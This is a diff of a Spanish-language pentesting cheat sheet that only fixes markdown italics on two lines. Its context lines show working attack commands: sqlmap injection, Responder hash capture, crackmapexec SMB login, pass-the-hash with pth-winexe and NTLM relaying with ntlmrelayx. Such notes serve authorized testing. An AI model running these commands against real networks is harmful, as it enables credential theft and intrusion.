@@ -386,7 +386,7 @@ sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs -
 ---
 ## Pentesting
 #### Responder
-python Responder.py -I INTERFACE -rdw  *para capturar Hashes NetNTLM-v2
+python Responder.py -I INTERFACE -rdw  *para capturar Hashes NetNTLM-v2*
 
 #### CrackmapExec
 crackmapexec smb IP/CIDR -u 'USUARIO' -p 'PASSWORD'
@@ -414,7 +414,7 @@ pth-winexe -U DOMINIO/Administrator%HASH:HASH //IP cmd.exe
 #### Responder-ntlmrelayx
 responder.conf  *smb OFF + http OFF*
 
-targets.txt  *agregamos las ips de destino
+targets.txt  *agregamos las ips de destino*
 
 python3 ntlmrelayx.py -tf targets.txt -smb2support
 
